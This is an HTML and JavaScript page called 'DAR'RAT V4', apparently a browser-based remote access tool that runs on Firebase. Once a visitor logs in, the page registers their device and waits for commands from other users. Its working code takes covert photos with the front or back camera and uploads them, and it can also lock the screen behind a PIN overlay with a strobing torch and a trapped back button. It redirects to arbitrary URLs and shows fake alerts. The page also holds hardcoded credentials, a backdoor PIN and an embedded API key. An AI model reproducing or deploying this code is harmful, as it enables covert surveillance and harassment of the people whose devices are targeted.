<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DAR'RAT V4 | STABLE ENGINE</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
        :root { 
            --neon-purple: #BC13FE; 
            --deep-purple: #1a0033;
            --bright-purple: #9d00ff;
            --neon-blue: #00D4FF; 
            --dark: #050508; 
            --neon-red: #FF0000; 
        }
        
        body { font-family: 'Orbitron', sans-serif; background: var(--dark); color: white; margin: 0; padding: 20px; overflow-x: hidden; touch-action: manipulation; }
        
        /* LOGIN PAGE */
        #loginPage { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .video-container { width: 100%; max-width: 400px; border: 2px solid var(--neon-purple); border-radius: 15px; overflow: hidden; margin-bottom: 20px; }
        
        .input-group { position: relative; margin: 15px 0; width: 80%; max-width: 300px; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--neon-purple); z-index: 5; font-size: 18px; }
        .login-input { width: 100%; padding: 12px 12px 12px 45px; background: rgba(188,19,254,0.1); border: 1px solid var(--neon-purple); border-radius: 8px; color: white; font-family: 'Orbitron'; outline: none; box-sizing: border-box; position: relative; }
        
        .social-links { margin-top: 25px; display: flex; gap: 30px; }
        .social-links a { font-size: 30px; transition: 0.3s; }
        .fa-telegram { color: #0088cc; }
        .fa-whatsapp { color: #25d366; }

        /* LOCK OVERLAY */
        #pinOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100000; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
        .scan-line-v { position: absolute; height: 100%; width: 1px; background: rgba(255, 0, 0, 0.6); left: 50%; box-shadow: 0 0 15px red; z-index: 1; }
        .lock-icon-img { font-size: 100px; color: var(--neon-red); filter: drop-shadow(0 0 20px #ff0000); margin-bottom: 20px; z-index: 2; }
        .pin-input-custom { background: transparent; border: 1px solid #ff0000; border-radius: 5px; color: white; text-align: center; padding: 12px; width: 260px; margin-bottom: 20px; font-family: 'Orbitron'; outline: none; z-index: 2; font-size: 16px; }
        .access-btn { background: #ff0000; color: white; border: none; padding: 12px 70px; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; z-index: 2; box-shadow: 0 0 15px rgba(255,0,0,0.5); }

        /* DASHBOARD UI */
        .device-card { display: none; margin-bottom: 15px; padding: 20px; background: var(--deep-purple); border: 1px solid var(--bright-purple); border-radius: 15px; box-shadow: 0 0 15px rgba(157, 0, 255, 0.2); }
        .command-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 20px; }
        .cmd-box { background: var(--deep-purple); border: 2px solid var(--bright-purple); padding: 20px 10px; border-radius: 15px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; transition: 0.3s; }
        .cmd-box i { font-size: 30px; color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue); }
        .cmd-box span { font-size: 10px; font-weight: bold; text-transform: uppercase; }

        #photoGallery { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
        .img-box { width: 100%; aspect-ratio: 1/1; border-radius: 10px; border: 1px solid var(--bright-purple); background: #111; overflow: hidden; }
        .img-box img { width: 100%; height: 100%; object-fit: cover; }
        .hidden { display: none; }
    </style>
</head>
<body onclick="playMusic()">

    <div id="loginPage">
        <div class="video-container">
            <video id="vidLogin" width="100%" autoplay loop muted playsinline><source src="https://www.image2url.com/r2/default/videos/1776188499689-a2f4233c-a535-42a7-8db2-9fdc401c4351.mp4" type="video/mp4"></video>
        </div>
        
        <div class="input-group">
            <i class="fas fa-user"></i>
            <input type="text" id="userInp" class="login-input" placeholder="Username">
        </div>
        
        <div class="input-group">
            <i class="fas fa-lock"></i>
            <input type="password" id="passInp" class="login-input" placeholder="Password">
        </div>
        
        <button onclick="handleLogin()" style="width:80%; max-width:300px; padding:12px; background:var(--bright-purple); border:none; color:white; font-weight:bold; border-radius:8px; cursor:pointer; box-shadow: 0 0 10px var(--bright-purple);">ENTER ENGINE</button>
        
        <div class="social-links">
            <a href="https://t.me/zyrex909"><i class="fab fa-telegram"></i></a>
            <a href="https://wa.me/6283165547907"><i class="fab fa-whatsapp"></i></a>
        </div>
    </div>

    <audio id="bgMusic" loop><source src="https://www.image2url.com/r2/default/videos/1776188499689-a2f4233c-a535-42a7-8db2-9fdc401c4351.mp4" type="audio/mpeg"></audio>

    <div id="pinOverlay">
        <div class="scan-line-v"></div>
        <p id="lockCustomMsg" style="color:white; font-size:14px; margin-bottom:10px; letter-spacing: 2px; text-transform:uppercase; z-index:2;"></p>
        <div class="lock-icon-img"><i class="fas fa-lock"></i></div>
        <input type="number" id="pinInput" class="pin-input-custom" placeholder="ENTER PIN" inputmode="numeric">
        <button onclick="checkPin()" class="access-btn">ACCESS</button>
    </div>

    <div id="mainApp" class="hidden">
        <div id="page1">
            <div style="margin-bottom:20px;">
                <div style="font-size:10px; color:var(--neon-blue); margin-bottom:10px;">ID: <span id="displayMyId" style="color:white">...</span></div>
                <input type="text" id="searchDeviceId" style="width:100%; padding:15px; background:var(--deep-purple); border:1px solid var(--bright-purple); border-radius:12px; color:white; outline:none; box-sizing:border-box;" placeholder="MASUKKAN TARGET ID DENGAN BENAR..." oninput="filterDevices()">
            </div>
            <div id="deviceList"></div>
        </div>

        <div id="page2" class="hidden">
            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid var(--bright-purple); padding-bottom:10px; margin-bottom:15px;">
                <h3 id="targetName" style="font-size:13px; color:var(--neon-blue); margin:0;">DEVICE</h3>
                <button onclick="goBack()" style="background:var(--neon-red); border:none; color:white; font-size:9px; padding:8px 15px; border-radius:5px;">EXIT</button>
            </div>
            <div class="command-grid">
                <div class="cmd-box" onclick="promptLock()"><i class="fas fa-user-lock"></i><span>Lock Pin</span></div>
                <div class="cmd-box" onclick="sendCommand('vibrate')"><i class="fas fa-mobile-alt"></i><span>Vibrate</span></div>
                <div class="cmd-box" onclick="promptAlert()"><i class="fas fa-exclamation-triangle"></i><span>Fake Alert</span></div>
                <div class="cmd-box" onclick="sendCommand('flashlight')"><i class="fas fa-lightbulb"></i><span>Flashlight</span></div>
                <div class="cmd-box" onclick="promptRedirect()"><i class="fas fa-share-square"></i><span>Redirect</span></div>
                <div class="cmd-box" onclick="sendCommand('fullscreen')"><i class="fas fa-expand"></i><span>Fullscreen</span></div>
            </div>
            <div style="margin-top:15px; display:flex; flex-wrap:wrap; gap:10px;">
                <button style="flex:1; padding:12px; background:var(--neon-red); border:none; color:white; border-radius:8px; font-size:10px;" onclick="sendCommand('black_screen')">🌑 BLACK SCREEN</button>
                <button style="flex:1; padding:12px; background:var(--deep-purple); border:1px solid var(--neon-blue); color:var(--neon-blue); border-radius:8px; font-size:10px;" onclick="sendCommand('reload')">🔄 REFRESH</button>
            </div>
            <div style="margin-top:20px; padding:15px; background:var(--deep-purple); border:1px solid var(--bright-purple); border-radius:15px;">
                <h4 style="margin:0 0 10px 0; font-size:11px; color:var(--neon-blue);"><i class="fas fa-camera"></i> CAMERA</h4>
                <div style="display:flex; justify-content:space-between;">
                    <button style="width:48%; padding:10px; background:var(--bright-purple); border:none; border-radius:5px; color:white; font-size:10px;" onclick="sendCommand('take_photo', 'user')">FRONT</button>
                    <button style="width:48%; padding:10px; background:var(--bright-purple); border:none; border-radius:5px; color:white; font-size:10px;" onclick="sendCommand('take_photo', 'environment')">BACK</button>
                </div>
                <div id="photoGallery"></div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, update, push, serverTimestamp, onDisconnect } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyChr3KlMoSsCiplwoZGKPxByXVFcdT0_o0",
            authDomain: "zyrexx-a68bc.firebaseapp.com",
            databaseURL: "https://zyrexx-a68bc-default-rtdb.firebaseio.com",
            projectId: "zyrexx-a68bc",
            appId: "1:894023493871:web:ec185cf462c1ee8cb4d31a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        
        // Hanya akun utama, akun user01-10 dihapus
        const accountDB = { "zyrex": "zyrex909" };
        
        window.deviceId = localStorage.getItem('deviceId') || 'DAR-' + Math.random().toString(36).substr(2, 4).toUpperCase();
        localStorage.setItem('deviceId', window.deviceId);
        document.getElementById('displayMyId').innerText = window.deviceId;

        // Audio tetap jalan setelah login
        window.playMusic = () => { 
            const bgm = document.getElementById('bgMusic');
            if(bgm.paused) bgm.play().catch(()=>{}); 
        };

        window.handleLogin = () => {
            const u = document.getElementById('userInp').value;
            const p = document.getElementById('passInp').value;
            if(accountDB[u] === p) {
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('mainApp').classList.remove('hidden');
                window.playMusic(); 
                initEngine();
            } else { Swal.fire('Error', 'Wrong Creds', 'error'); }
        };

        function initEngine() {
            const dRef = ref(db, 'devices/' + window.deviceId);
            update(dRef, { online: true, lastSeen: serverTimestamp() });
            onDisconnect(dRef).update({ online: false });

            onValue(ref(db, 'devices/' + window.deviceId + '/command'), (s) => {
                const cmd = s.val();
                if(cmd) { executeCommand(cmd); update(ref(db, 'devices/' + window.deviceId), { command: null }); }
            });

            onValue(ref(db, 'devices/'), (s) => {
                const list = document.getElementById('deviceList');
                list.innerHTML = "";
                const data = s.val() || {};
                Object.keys(data).forEach(id => {
                    const card = document.createElement('div');
                    card.className = 'device-card'; card.setAttribute('data-id', id.toUpperCase());
                    card.innerHTML = `<div onclick="openTarget('${id}')"><b style="color:var(--neon-blue)">${id}</b><br><small>${data[id].online ? '🟢 ONLINE' : '🔴 OFFLINE'}</small></div>`;
                    list.appendChild(card);
                });
            });
        }

        async function executeCommand(cmd) {
            switch(cmd.type) {
                case 'lock_system': 
                    enterHardLock();
                    document.getElementById('pinOverlay').style.display = 'flex';
                    document.getElementById('lockCustomMsg').innerText = cmd.msg || "WKWK";
                    window.correctPin = cmd.pin;
                    
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}});
                        const track = stream.getVideoTracks()[0];
                        let strobe = true;
                        const interval = setInterval(async () => {
                            if (document.getElementById('pinOverlay').style.display === 'none') { clearInterval(interval); track.stop(); return; }
                            await track.applyConstraints({advanced: [{torch: strobe}]});
                            strobe = !strobe;
                        }, 200);
                    } catch(e) {}
                    break;
                case 'vibrate': navigator.vibrate([500, 200, 500]); break;
                case 'alert': Swal.fire('SYSTEM', cmd.value, 'warning'); break;
                case 'flashlight':
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}});
                        const track = stream.getVideoTracks()[0];
                        await track.applyConstraints({advanced: [{torch: true}]});
                        setTimeout(() => track.stop(), 5000);
                    } catch(e) {} break;
                case 'take_photo':
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: cmd.value}});
                        const v = document.createElement('video'); v.srcObject = stream; await v.play();
                        setTimeout(async () => {
                            const c = document.createElement('canvas'); 
                            c.width = 400; c.height = (v.videoHeight / v.videoWidth) * 400;
                            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                            const imgBase64 = c.toDataURL('image/jpeg', 0.5);
                            await push(ref(db, `devices/${window.deviceId}/photos`), {img: imgBase64});
                            stream.getTracks().forEach(t => t.stop());
                        }, 1000);
                    } catch(e) {} break;
                case 'redirect': window.location.href = cmd.value; break;
                case 'fullscreen': enterHardLock(); break;
                case 'reload': location.reload(); break;
            }
        }

        function enterHardLock() {
            try {
                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
                else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
            } catch(e) {}
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => { window.history.go(1); };
        }

        window.filterDevices = () => {
            const v = document.getElementById('searchDeviceId').value.trim().toUpperCase();
            document.querySelectorAll('.device-card').forEach(c => {
                c.style.display = (v !== "" && c.getAttribute('data-id') === v) ? 'block' : 'none';
            });
        };

        window.checkPin = () => {
            const val = document.getElementById('pinInput').value;
            if(val === window.correctPin || val === "9090") {
                document.getElementById('pinOverlay').style.display = 'none';
                document.getElementById('pinInput').value = "";
                window.onpopstate = null;
                if(document.exitFullscreen) document.exitFullscreen();
            } else { 
                Swal.fire({title:'DENIED', icon:'error', background:'#000', color:'#f00'}); 
                enterHardLock();
            }
        };

        window.sendCommand = (type, value = null) => {
            if(!window.targetId) return;
            update(ref(db, 'devices/'+window.targetId), { command: { type, value } });
        };

        window.promptLock = async () => {
            const { value: f } = await Swal.fire({
                title: 'LOCK DEVICE', background: '#1a0033', color: '#fff',
                html: '<input id="sw-p" class="swal2-input" placeholder="Set PIN"><input id="sw-m" class="swal2-input" placeholder="Message">',
                preConfirm: () => [document.getElementById('sw-p').value, document.getElementById('sw-m').value]
            });
            if (f) update(ref(db, 'devices/'+window.targetId), { command: { type: 'lock_system', pin: f[0], msg: f[1] } });
        };

        window.promptAlert = () => { Swal.fire({title:'Alert', input:'text', background: '#1a0033', color: '#fff'}).then(r => r.value && sendCommand('alert', r.value)); };
        window.promptRedirect = () => { Swal.fire({title:'URL', input:'text', background: '#1a0033', color: '#fff'}).then(r => r.value && sendCommand('redirect', r.value)); };
        
        window.openTarget = (id) => {
            window.targetId = id;
            document.getElementById('targetName').innerText = id;
            document.getElementById('page1').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
            onValue(ref(db, 'devices/'+id), s => {
                const d = s.val();
                const gal = document.getElementById('photoGallery'); gal.innerHTML = "";
                if(d?.photos) {
                    Object.values(d.photos).reverse().slice(0, 6).forEach(p => {
                        gal.innerHTML += `<div class="img-box"><img src="${p.img}"></div>`;
                    });
                }
            });
        };
        window.goBack = () => { document.getElementById('page2').classList.add('hidden'); document.getElementById('page1').classList.remove('hidden'); };

        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && document.getElementById('pinOverlay').style.display === 'flex') {
                enterHardLock();
            }
        });
    </script>
</body>
</html>
